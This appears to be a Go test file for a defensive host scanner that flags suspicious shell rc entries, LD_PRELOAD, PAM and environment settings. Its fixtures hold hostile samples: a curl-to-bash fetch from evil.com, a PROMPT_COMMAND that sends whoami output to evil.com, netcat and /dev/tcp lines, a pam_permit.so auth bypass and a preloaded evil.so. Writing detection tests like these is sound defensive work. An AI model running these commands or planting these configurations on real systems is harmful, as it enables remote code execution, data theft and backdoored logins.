package environment_test

import (
	"context"
	"os"
	"path/filepath"
	"testing"

	"github.com/nunenuh/defense-kit/defense-kit-cli/internal/scanner"
	"github.com/nunenuh/defense-kit/defense-kit-cli/internal/scanner/environment"
)

// TestShellRCScanner_DetectsSuspiciousEntries creates a temp .bashrc with malicious
// lines and verifies that the scanner produces findings for each one.
func TestShellRCScanner_DetectsSuspiciousEntries(t *testing.T) {
	dir := t.TempDir()
	bashrc := filepath.Join(dir, ".bashrc")

	content := `# normal comment
export PS1="\u@\h"
curl http://evil.com/payload.sh | bash
eval $(echo aGVsbG8= | base64 -d)
export PATH=/tmp/malware:$PATH
nc -l 4444
/dev/tcp/192.168.1.1/4444
PROMPT_COMMAND="curl http://evil.com?data=$(whoami)"
`
	if err := os.WriteFile(bashrc, []byte(content), 0o644); err != nil {
		t.Fatalf("failed to write temp .bashrc: %v", err)
	}

	s := environment.NewShellRCScanner()
	opts := scanner.ScanOptions{
		TargetPaths: []string{dir},
	}
	findings, err := s.Scan(context.Background(), opts)
	if err != nil {
		t.Fatalf("Scan returned error: %v", err)
	}

	if len(findings) == 0 {
		t.Fatal("expected findings but got none")
	}

	// Verify each finding has required fields populated.
	for _, f := range findings {
		if f.ID == "" {
			t.Error("finding has empty ID")
		}
		if f.Scanner == "" {
			t.Error("finding has empty Scanner")
		}
		if f.Evidence == "" {
			t.Error("finding has empty Evidence")
		}
		if f.Location == "" {
			t.Error("finding has empty Location")
		}
	}

	// We expect at least 6 distinct findings (one per malicious line).
	if len(findings) < 6 {
		t.Errorf("expected at least 6 findings, got %d", len(findings))
	}
}

// TestShellRCScanner_CleanFileNoFindings verifies that a clean .bashrc produces
// zero findings.
func TestShellRCScanner_CleanFileNoFindings(t *testing.T) {
	dir := t.TempDir()
	bashrc := filepath.Join(dir, ".bashrc")

	content := `# normal comment
export PS1="\u@\h \w $ "
alias ll='ls -la'
export EDITOR=vim
source ~/.bash_aliases
`
	if err := os.WriteFile(bashrc, []byte(content), 0o644); err != nil {
		t.Fatalf("failed to write temp .bashrc: %v", err)
	}

	s := environment.NewShellRCScanner()
	opts := scanner.ScanOptions{
		TargetPaths: []string{dir},
	}
	findings, err := s.Scan(context.Background(), opts)
	if err != nil {
		t.Fatalf("Scan returned error: %v", err)
	}

	if len(findings) != 0 {
		t.Errorf("expected 0 findings for clean file, got %d: %+v", len(findings), findings)
	}
}

// TestShellRCScanner_Interface verifies the scanner metadata methods.
func TestShellRCScanner_Interface(t *testing.T) {
	s := environment.NewShellRCScanner()

	if s.Name() != "shell_rc" {
		t.Errorf("Name() = %q, want %q", s.Name(), "shell_rc")
	}
	if s.Category() != "environment" {
		t.Errorf("Category() = %q, want %q", s.Category(), "environment")
	}
	if s.RequiresRoot() {
		t.Error("RequiresRoot() should be false")
	}
	if !s.Available() {
		t.Error("Available() should be true")
	}
	if s.Description() == "" {
		t.Error("Description() should not be empty")
	}
}

// TestEnvVarsScanner_Interface verifies the scanner metadata methods.
func TestEnvVarsScanner_Interface(t *testing.T) {
	s := environment.NewEnvVarsScanner()

	if s.Name() != "env_vars" {
		t.Errorf("Name() = %q, want %q", s.Name(), "env_vars")
	}
	if s.Category() != "environment" {
		t.Errorf("Category() = %q, want %q", s.Category(), "environment")
	}
	if s.RequiresRoot() {
		t.Error("RequiresRoot() should be false")
	}
	if !s.Available() {
		t.Error("Available() should be true")
	}
	if s.Description() == "" {
		t.Error("Description() should not be empty")
	}
}

// TestLDPreloadScanner_Interface verifies the scanner metadata methods,
// in particular that RequiresRoot returns true.
func TestLDPreloadScanner_Interface(t *testing.T) {
	s := environment.NewLDPreloadScanner()

	if s.Name() != "ld_preload" {
		t.Errorf("Name() = %q, want %q", s.Name(), "ld_preload")
	}
	if s.Category() != "environment" {
		t.Errorf("Category() = %q, want %q", s.Category(), "environment")
	}
	if !s.RequiresRoot() {
		t.Error("RequiresRoot() should be true")
	}
	if s.Description() == "" {
		t.Error("Description() should not be empty")
	}
}

// TestPAMScanner_Interface verifies the scanner metadata methods,
// in particular that RequiresRoot returns true.
func TestPAMScanner_Interface(t *testing.T) {
	s := environment.NewPAMScanner()

	if s.Name() != "pam" {
		t.Errorf("Name() = %q, want %q", s.Name(), "pam")
	}
	if s.Category() != "environment" {
		t.Errorf("Category() = %q, want %q", s.Category(), "environment")
	}
	if !s.RequiresRoot() {
		t.Error("RequiresRoot() should be true")
	}
	if s.Description() == "" {
		t.Error("Description() should not be empty")
	}
}

// --- LDPreload detection tests using injectable paths ---

func TestLDPreloadScanner_DetectsPreloadEntry(t *testing.T) {
	dir := t.TempDir()
	preloadPath := filepath.Join(dir, "ld.so.preload")
	confDir := filepath.Join(dir, "ld.so.conf.d")
	os.MkdirAll(confDir, 0o755)

	os.WriteFile(preloadPath, []byte("/lib/evil.so\n"), 0o644)

	s := environment.NewLDPreloadScannerWithPaths(preloadPath, confDir)
	findings, err := s.Scan(context.Background(), scanner.ScanOptions{})
	if err != nil {
		t.Fatal(err)
	}
	if len(findings) != 1 {
		t.Fatalf("expected 1 finding, got %d", len(findings))
	}
	if findings[0].Severity != scanner.SevCritical {
		t.Errorf("severity = %v, want CRITICAL", findings[0].Severity)
	}
}

func TestLDPreloadScanner_DetectsConfDSuspiciousPath(t *testing.T) {
	dir := t.TempDir()
	preloadPath := filepath.Join(dir, "ld.so.preload")
	confDir := filepath.Join(dir, "ld.so.conf.d")
	os.MkdirAll(confDir, 0o755)

	os.WriteFile(preloadPath, []byte(""), 0o644)
	os.WriteFile(filepath.Join(confDir, "evil.conf"), []byte("/tmp/libs\n"), 0o644)

	s := environment.NewLDPreloadScannerWithPaths(preloadPath, confDir)
	findings, err := s.Scan(context.Background(), scanner.ScanOptions{})
	if err != nil {
		t.Fatal(err)
	}
	if len(findings) != 1 {
		t.Fatalf("expected 1 finding, got %d", len(findings))
	}
	if findings[0].Severity != scanner.SevHigh {
		t.Errorf("severity = %v, want HIGH", findings[0].Severity)
	}
}

func TestLDPreloadScanner_EmptyFilesNoFindings(t *testing.T) {
	dir := t.TempDir()
	preloadPath := filepath.Join(dir, "ld.so.preload")
	confDir := filepath.Join(dir, "ld.so.conf.d")
	os.MkdirAll(confDir, 0o755)

	os.WriteFile(preloadPath, []byte("# only comments\n"), 0o644)
	os.WriteFile(filepath.Join(confDir, "clean.conf"), []byte("/usr/lib\n"), 0o644)

	s := environment.NewLDPreloadScannerWithPaths(preloadPath, confDir)
	findings, err := s.Scan(context.Background(), scanner.ScanOptions{})
	if err != nil {
		t.Fatal(err)
	}
	if len(findings) != 0 {
		t.Errorf("expected 0 findings, got %d", len(findings))
	}
}

// --- PAM detection tests using injectable path ---

func TestPAMScanner_DetectsPamPermitAuth(t *testing.T) {
	dir := t.TempDir()
	pamDir := filepath.Join(dir, "pam.d")
	os.MkdirAll(pamDir, 0o755)

	os.WriteFile(filepath.Join(pamDir, "test-service"), []byte("auth required pam_permit.so\n"), 0o644)

	s := environment.NewPAMScannerWithPath(pamDir)
	findings, err := s.Scan(context.Background(), scanner.ScanOptions{})
	if err != nil {
		t.Fatal(err)
	}
	if len(findings) == 0 {
		t.Fatal("expected findings for pam_permit.so in auth context")
	}
	// pam_permit.so in auth context should be CRITICAL
	found := false
	for _, f := range findings {
		if f.Severity == scanner.SevCritical {
			found = true
		}
	}
	if !found {
		t.Error("expected CRITICAL finding for pam_permit.so in auth context")
	}
}

func TestPAMScanner_DetectsPamExec(t *testing.T) {
	dir := t.TempDir()
	pamDir := filepath.Join(dir, "pam.d")
	os.MkdirAll(pamDir, 0o755)

	os.WriteFile(filepath.Join(pamDir, "backdoor"), []byte("session required pam_exec.so /tmp/evil.sh\n"), 0o644)

	s := environment.NewPAMScannerWithPath(pamDir)
	findings, err := s.Scan(context.Background(), scanner.ScanOptions{})
	if err != nil {
		t.Fatal(err)
	}
	if len(findings) == 0 {
		t.Fatal("expected findings for pam_exec.so")
	}
}

func TestPAMScanner_CleanConfigNoSuspiciousModules(t *testing.T) {
	dir := t.TempDir()
	pamDir := filepath.Join(dir, "pam.d")
	os.MkdirAll(pamDir, 0o755)

	// Use only pam_unix.so — a standard module. The scanner may flag it
	// as unowned by dpkg (since our temp path isn't a real package), so
	// we only check that no CRITICAL findings are produced.
	os.WriteFile(filepath.Join(pamDir, "test-auth"), []byte("auth required pam_unix.so\n"), 0o644)

	s := environment.NewPAMScannerWithPath(pamDir)
	findings, err := s.Scan(context.Background(), scanner.ScanOptions{})
	if err != nil {
		t.Fatal(err)
	}
	for _, f := range findings {
		if f.Severity == scanner.SevCritical {
			t.Errorf("unexpected CRITICAL finding: %s", f.Title)
		}
	}
}

// --- EnvVars detection tests ---

func TestEnvVarsScanner_DetectsLDPreload(t *testing.T) {
	t.Setenv("LD_PRELOAD", "/tmp/evil.so")
	s := environment.NewEnvVarsScanner()
	findings, err := s.Scan(context.Background(), scanner.ScanOptions{})
	if err != nil {
		t.Fatal(err)
	}
	found := false
	for _, f := range findings {
		if f.Severity == scanner.SevCritical && f.Scanner == "env_vars" {
			found = true
		}
	}
	if !found {
		t.Error("expected CRITICAL finding for LD_PRELOAD")
	}
}

func TestEnvVarsScanner_DetectsPathWithTmp(t *testing.T) {
	t.Setenv("PATH", "/usr/bin:/tmp/evil:/bin")
	s := environment.NewEnvVarsScanner()
	findings, err := s.Scan(context.Background(), scanner.ScanOptions{})
	if err != nil {
		t.Fatal(err)
	}
	found := false
	for _, f := range findings {
		if f.Scanner == "env_vars" && f.Severity == scanner.SevHigh {
			found = true
		}
	}
	if !found {
		t.Error("expected HIGH finding for /tmp in PATH")
	}
}
